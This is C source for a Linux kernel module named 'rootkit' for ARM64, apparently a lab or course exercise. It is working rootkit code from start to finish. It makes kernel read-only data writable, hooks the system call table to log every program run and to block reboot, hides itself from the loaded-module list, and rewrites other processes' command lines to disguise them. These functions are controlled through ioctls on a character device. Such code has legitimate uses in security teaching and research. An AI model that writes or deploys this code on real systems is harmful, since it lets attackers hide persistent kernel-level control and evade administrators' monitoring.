#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/kprobes.h>
#include <asm/syscall.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

static long is_hide;
static char path[PATH_MAX];

struct list_head *modules_;
static int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
			void *buf, int len, unsigned int gup_flags);
static void (*update_mapping_prot_)(phys_addr_t phys, unsigned long virt,
			phys_addr_t size, pgprot_t prot);
static syscall_fn_t *sys_call_table_;
static long (*__arm64_sys_execve_)(const struct pt_regs *regs);
static long (*__arm64_sys_reboot_)(const struct pt_regs *regs);
static unsigned long __start_rodata_, __end_rodata_;

static long hook_execve(const struct pt_regs *regs)
{
	if (copy_from_user(path, (void *)regs->regs[0], PATH_MAX))
		pr_info("copy_from_user fail.\n");
	pr_info("exec %s\n", path);
	return __arm64_sys_execve_(regs);
}

static long hook_reboot(const struct pt_regs *regs)
{
	return -EFAULT;
}

/*
 * Lookup necessary kernel symbols.
 */
static void ksym_lookup(void)
{
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"};
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;

	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	modules_ = (void *)kallsyms_lookup_name("modules");
	access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
	update_mapping_prot_ =
		(void *)kallsyms_lookup_name("update_mapping_prot");
	sys_call_table_ = (void *)kallsyms_lookup_name("sys_call_table");
	__arm64_sys_execve_ =
		(void *)kallsyms_lookup_name("__arm64_sys_execve");
	__arm64_sys_reboot_ =
		(void *)kallsyms_lookup_name("__arm64_sys_reboot");
	__start_rodata_ = (unsigned long)kallsyms_lookup_name("__start_rodata");
	__end_rodata_ = (unsigned long)kallsyms_lookup_name("__end_rodata");

	if (modules_ == NULL ||
		access_remote_vm_ == NULL ||
		update_mapping_prot_ == NULL ||
		sys_call_table_ == NULL ||
		__start_rodata_ == 0 ||
		__end_rodata_ == 0 ||
		sys_call_table_[__NR_execve] !=  __arm64_sys_execve_ ||
		sys_call_table_[__NR_reboot] !=  __arm64_sys_reboot_)
		pr_info("Lookup kernel symbols fail!\n");
}

static void hook_sys_call_table(void)
{
	sys_call_table_[__NR_execve] = hook_execve;
	sys_call_table_[__NR_reboot] = hook_reboot;
}

static void restore_sys_call_table(void)
{
	sys_call_table_[__NR_execve] = __arm64_sys_execve_;
	sys_call_table_[__NR_reboot] = __arm64_sys_reboot_;
}

static void update_rodata_prot(void)
{
	update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_,
				__end_rodata_ - __start_rodata_, PAGE_KERNEL);
}

static void do_hide(void)
{
	if (is_hide) {
		list_add_rcu(&(THIS_MODULE->list), modules_);
		is_hide = 0;
	} else {
		list_del_rcu(&(THIS_MODULE->list));
		is_hide = 1;
	}
}

/*
 * Check get_mm_cmdline
 */
static int access_mm_name(struct mm_struct *mm, char *name, int len,
						unsigned int gup_flags)
{
	unsigned long arg_start, arg_end;

	if (!mm->env_end)
		return 0;

	spin_lock(&mm->arg_lock);
	arg_start = mm->arg_start;
	arg_end = mm->arg_end;
	spin_unlock(&mm->arg_lock);

	if (arg_start >= arg_end)
		return 0;

	return access_remote_vm_(mm, arg_start, name, len, gup_flags);
}

static void normalize_masq_proc(long len, struct masq_proc *masq_proc)
{
	long i, j;

	for (i = 0; i < len; ++i) {
		if (strlen(masq_proc[i].new_name) >
			strlen(masq_proc[i].orig_name))
			masq_proc[i].orig_name[0] = 0;
		for (j = strlen(masq_proc[i].new_name);
			j < strlen(masq_proc[i].orig_name); ++j)
			masq_proc[i].new_name[j] = 0;
	}
}

static void rename_process(struct task_struct *p, long len,
						   struct masq_proc *masq_proc)
{
	long i;
	struct mm_struct *mm;
	char task_name[MASQ_LEN];

	mm = p->mm;
	if (!mm)
		return;
	access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
	task_name[MASQ_LEN - 1] = 0;

	for (i = 0; i < len; ++i) {
		if (!masq_proc[i].orig_name[0])
			continue;
		if (!strcmp(task_name, masq_proc[i].orig_name)) {
			access_mm_name(mm, masq_proc[i].new_name,
			   strlen(masq_proc[i].orig_name), FOLL_WRITE);
			return;
		}
	}
	// mmput(mm);
}

static long do_masq(struct masq_proc_req __user *masq_proc_req_user)
{
	struct masq_proc_req masq_proc_req;
	struct masq_proc *masq_proc;
	struct task_struct *p;

	if (copy_from_user(&masq_proc_req, masq_proc_req_user,
			sizeof(struct masq_proc_req))) {
		pr_info("First copy_from_user fail.\n");
		return -EINVAL;
	}

	masq_proc = kmalloc(sizeof(struct masq_proc) * masq_proc_req.len,
				   GFP_KERNEL);
	if (masq_proc == NULL)
		return -EINVAL;

	if (copy_from_user(masq_proc,
		(struct masq_proc __user *) masq_proc_req.list,
		sizeof(struct masq_proc) * masq_proc_req.len)) {
		pr_info("Second copy_from_user fail.\n");
		kfree(masq_proc);
		return -EINVAL;
	}

	normalize_masq_proc(masq_proc_req.len, masq_proc);
	for_each_process(p) {
		rename_process(p, masq_proc_req.len, masq_proc);
	}

	kfree(masq_proc);
	return 0;
}

static int major;
struct cdev *kernel_cdev;

static int rootkit_open(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
	long ret = 0;

	pr_info("%s\n", __func__);
	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		hook_sys_call_table();
		break;
	case IOCTL_MOD_HIDE:
		do_hide();
		break;
	case IOCTL_MOD_MASQ:
		ret = do_masq((struct masq_proc_req __user *)arg);
		break;
	default:
		ret = -EINVAL;
	}

	return ret;
}

const struct file_operations fops = {
open: rootkit_open,
unlocked_ioctl : rootkit_ioctl,
release : rootkit_release,
owner : THIS_MODULE
};

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	ksym_lookup();
	update_rodata_prot();

	return 0;
}

static void __exit rootkit_exit(void)
{
	restore_sys_call_table();
	// TODO: restore .rodata protect?

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
